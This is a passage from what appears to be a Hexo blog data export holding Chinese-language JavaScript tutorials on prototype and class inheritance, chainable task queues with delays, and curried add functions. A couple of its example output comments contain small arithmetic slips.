混入式继承\"></a>4. 混入式继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyClass</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  SuperClass.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">  OtherSuperClass.call(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 继承一个类</span></span><br><span class=\"line\">MyClass.prototype = <span class=\"built_in\">Object</span>.create(SuperClass.prototype);</span><br><span class=\"line\"><span class=\"comment\">// 混合其它</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.assign(MyClass.prototype, OtherSuperClass.prototype);</span><br><span class=\"line\"><span class=\"comment\">// 重新指定constructor</span></span><br><span class=\"line\">MyClass.prototype.constructor = MyClass;</span><br><span class=\"line\"></span><br><span class=\"line\">MyClass.prototype.myMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// do something</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-原型式继承\"><a href=\"#5-原型式继承\" class=\"headerlink\" title=\"5. 原型式继承\"></a>5. 原型式继承</h2><p><strong>原型式继承</strong>适用于一个对象继承自另一个对象的情况，可以不必引入构造函数</p>\n<p>ECMAScript5 通过新增 Object.create()方法规范化了<strong>原型式继承</strong>。这个方法接收两个参数：一个用作新对象原型的对象和（可选的）一个为新对象定义额外属性的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\"> name: <span class=\"string\">&quot;Nicholas&quot;</span>,</span><br><span class=\"line\"> friends: [<span class=\"string\">&quot;Shelby&quot;</span>, <span class=\"string\">&quot;Court&quot;</span>, <span class=\"string\">&quot;Van&quot;</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">&quot;Greg&quot;</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">&quot;Rob&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">&quot;Linda&quot;</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">&quot;Barbie&quot;</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">// &quot;Shelby,Court,Van,Rob,Barbie&quot; </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟 Object.create() 方法</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.$create = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">original</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;&#125;;</span><br><span class=\"line\">  fn.prototype = original;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> fn();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的，不过别忘了，包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样</p>\n</blockquote>\n<h2 id=\"6-寄生式继承\"><a href=\"#6-寄生式继承\" class=\"headerlink\" title=\"6. 寄生式继承\"></a>6. 寄生式继承</h2><p><strong>寄生式继承</strong>是结合了原型式继承和工厂模式的一种方式，即创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象。适用于通过函数返回一个增强了的对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createAnother</span>(<span class=\"params\">original</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> clone = <span class=\"built_in\">Object</span>.create(original); <span class=\"comment\">// 通过调用函数创建一个新对象</span></span><br><span class=\"line\">  clone.sayHi = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;  <span class=\"comment\">//以某种方式来增强这个对象</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;hi&quot;</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> clone; <span class=\"comment\">//返回这个对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&quot;Nicholas&quot;</span>,</span><br><span class=\"line\">  friends: [<span class=\"string\">&quot;Shelby&quot;</span>, <span class=\"string\">&quot;Court&quot;</span>, <span class=\"string\">&quot;Van&quot;</span>],</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = createAnother(person);</span><br><span class=\"line\">anotherPerson.sayHi(); <span class=\"comment\">//&quot;hi&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>缺点：</p>\n<ol>\n<li>需要在构造函数中给每个对象添加函数，导致不能复用函数</li>\n</ol>\n<h2 id=\"7-寄生-原型链继承\"><a href=\"#7-寄生-原型链继承\" class=\"headerlink\" title=\"7. 寄生 + 原型链继承\"></a>7. 寄生 + 原型链继承</h2><p><strong>寄生 + 原型链是引用类型最理想的继承范式</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inheritPrototype</span>(<span class=\"params\">subType, superType</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> prototype = <span class=\"built_in\">Object</span>.create(superType.prototype); <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  prototype.constructor = subType; <span class=\"comment\">//增强对象</span></span><br><span class=\"line\">  subType.prototype = prototype; <span class=\"comment\">//指定对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.colors = [<span class=\"string\">&quot;red&quot;</span>, <span class=\"string\">&quot;blue&quot;</span>, <span class=\"string\">&quot;green&quot;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  SuperType.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\"></span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"8-Class-继承\"><a href=\"#8-Class-继承\" class=\"headerlink\" title=\"8. Class 继承\"></a>8. Class 继承</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">name</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"title\">sayHello</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">sayName</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;my name is &quot;</span> + <span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Child</span> <span class=\"keyword\">extends</span> <span class=\"title\">Parent</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">name, age</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">sayAge</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;my age is &quot;</span> + <span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.age;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> parent = <span class=\"keyword\">new</span> Parent(<span class=\"string\">&quot;Parent&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> child = <span class=\"keyword\">new</span> Child(<span class=\"string\">&quot;Child&quot;</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;parent: &quot;</span>, parent); <span class=\"comment\">// parent:  Parent &#123;name: &quot;Parent&quot;&#125;</span></span><br><span class=\"line\">Parent.sayHello(); <span class=\"comment\">// hello</span></span><br><span class=\"line\">parent.sayName(); <span class=\"comment\">// my name is Parent</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;child: &quot;</span>, child); <span class=\"comment\">// child:  Child &#123;name: &quot;Child&quot;, age: 18&#125;</span></span><br><span class=\"line\">Child.sayHello(); <span class=\"comment\">// hello</span></span><br><span class=\"line\">child.sayName(); <span class=\"comment\">// my name is Child</span></span><br><span class=\"line\">child.sayAge(); <span class=\"comment\">// my age is 18</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 1、构造器原型链</span></span><br><span class=\"line\">Child.__proto__ === Parent; <span class=\"comment\">// true</span></span><br><span class=\"line\">Parent.__proto__ === <span class=\"built_in\">Function</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.__proto__ === <span class=\"literal\">null</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"comment\">// 2、实例原型链</span></span><br><span class=\"line\">child.__proto__ === Child.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\">Child.prototype.__proto__ === Parent.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\">Parent.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.__proto__ === <span class=\"literal\">null</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"JS 链式调用与流程控制","date":"2021-03-12T07:32:28.000Z","_content":"\n# JS 链式调用与流程控制\n\n* 能链式调用\n* 能控制程序调用时机（休眠）\n* 同步函数在同一个执行栈中执行\n\n```js\nconst Person = function() {\n  this.tasks = [];\n\n  setTimeout(() => {\n    this.next();\n  }, 0);\n\n  return this;\n}\nPerson.prototype.next = function() {\n  const fn = this.tasks.shift();\n  fn && fn();\n}\nPerson.prototype.eat = function() {\n  const fn = () => {\n    console.log('eat');\n    this.next();\n  };\n  this.tasks.push(fn);\n  return this;\n}\nPerson.prototype.lunch = function() {\n  const fn = () => {\n    console.log('lunch');\n    this.next();\n  };\n  this.tasks.push(fn);\n  return this;\n}\nPerson.prototype.sleep = function(seconds) {\n  const fn = () => {\n    console.log(`sleep ${seconds} seconds`);\n    setTimeout(() => {\n      this.next();\n    }, seconds * 1000)\n  };\n  this.tasks.push(fn);\n  return this;\n}\n\nconst person = new Person();\n\nperson.eat().sleep(2).lunch().sleep(3).sleep(3)\n```","source":"_posts/JavaScript 编程题/JS 链式调用与流程控制.md","raw":"---\ntitle: JS 链式调用与流程控制\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# JS 链式调用与流程控制\n\n* 能链式调用\n* 能控制程序调用时机（休眠）\n* 同步函数在同一个执行栈中执行\n\n```js\nconst Person = function() {\n  this.tasks = [];\n\n  setTimeout(() => {\n    this.next();\n  }, 0);\n\n  return this;\n}\nPerson.prototype.next = function() {\n  const fn = this.tasks.shift();\n  fn && fn();\n}\nPerson.prototype.eat = function() {\n  const fn = () => {\n    console.log('eat');\n    this.next();\n  };\n  this.tasks.push(fn);\n  return this;\n}\nPerson.prototype.lunch = function() {\n  const fn = () => {\n    console.log('lunch');\n    this.next();\n  };\n  this.tasks.push(fn);\n  return this;\n}\nPerson.prototype.sleep = function(seconds) {\n  const fn = () => {\n    console.log(`sleep ${seconds} seconds`);\n    setTimeout(() => {\n      this.next();\n    }, seconds * 1000)\n  };\n  this.tasks.push(fn);\n  return this;\n}\n\nconst person = new Person();\n\nperson.eat().sleep(2).lunch().sleep(3).sleep(3)\n```","slug":"JavaScript 编程题/JS 链式调用与流程控制","published":1,"updated":"2021-04-30T06:59:04.090Z","_id":"cko3yr631000nio6rhjz9a75o","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"JS-链式调用与流程控制\"><a href=\"#JS-链式调用与流程控制\" class=\"headerlink\" title=\"JS 链式调用与流程控制\"></a>JS 链式调用与流程控制</h1><ul>\n<li>能链式调用</li>\n<li>能控制程序调用时机（休眠）</li>\n<li>同步函数在同一个执行栈中执行</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> Person = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.next = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"built_in\">this</span>.tasks.shift();</span><br><span class=\"line\">  fn &amp;&amp; fn();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.eat = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;eat&#x27;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.lunch = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;lunch&#x27;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.sleep = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">seconds</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`sleep <span class=\"subst\">$&#123;seconds&#125;</span> seconds`</span>);</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">    &#125;, seconds * <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> person = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\"></span><br><span class=\"line\">person.eat().sleep(<span class=\"number\">2</span>).lunch().sleep(<span class=\"number\">3</span>).sleep(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS-链式调用与流程控制\"><a href=\"#JS-链式调用与流程控制\" class=\"headerlink\" title=\"JS 链式调用与流程控制\"></a>JS 链式调用与流程控制</h1><ul>\n<li>能链式调用</li>\n<li>能控制程序调用时机（休眠）</li>\n<li>同步函数在同一个执行栈中执行</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> Person = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.next = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"built_in\">this</span>.tasks.shift();</span><br><span class=\"line\">  fn &amp;&amp; fn();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.eat = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;eat&#x27;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.lunch = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;lunch&#x27;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.sleep = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">seconds</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`sleep <span class=\"subst\">$&#123;seconds&#125;</span> seconds`</span>);</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.next();</span><br><span class=\"line\">    &#125;, seconds * <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.tasks.push(fn);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> person = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\"></span><br><span class=\"line\">person.eat().sleep(<span class=\"number\">2</span>).lunch().sleep(<span class=\"number\">3</span>).sleep(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>"},{"title":"JS 链式调用与累加功能","date":"2021-03-12T07:32:28.000Z","_content":"\n# JS 链式调用与累加功能\n\n## 1. 实现 add 函数使得满足以下条件\n\n**需满足的条件：**\n* add(1).sum() //=> 1\n* add(1)(2).sum() //=> 2\n* add(1)(2)(3).sum() //=> 6\n* add(1)(2)(3)(4).sum() //=> 10\n\n```js\nfunction add(a) {\n  let total = a\n  const fn = function(b) {\n    total += b\n    return fn\n  }\n  fn.sum = function() {\n    return total\n  }\n\n  return fn\n}\nadd(1).sum() // => 1\nadd(1)(2).sum() //=> 3\nadd(1)(2)(3).sum() //=> 6\nadd(1)(2)(3)(4).sum() //=> 10\n```\n\n## 2. 实现 add 函数使得满足以下条件\n\n**需满足的条件:**\n* add(1) // => 1;\n* add(1)(2) //=> 3;\n* add(1)(2)(3) //=> 6;\n* add(1)(2)(3)(4) //=> 10;\n\n```js\nfunction add(num1) {\n  const sum = function(num2) {\n    num1 += num2\n    return sum\n  }\n  sum.toString = function() {\n    return num1\n  }\n\n  return sum\n}\n\nadd(1) // output: 1\nadd(1)(2) // output: 3\nadd(1)(2)(3) // output: 4\n```\n\n**需满足的条件：**\n* add(1); // 1\n* add(1)(2); // 3\n* 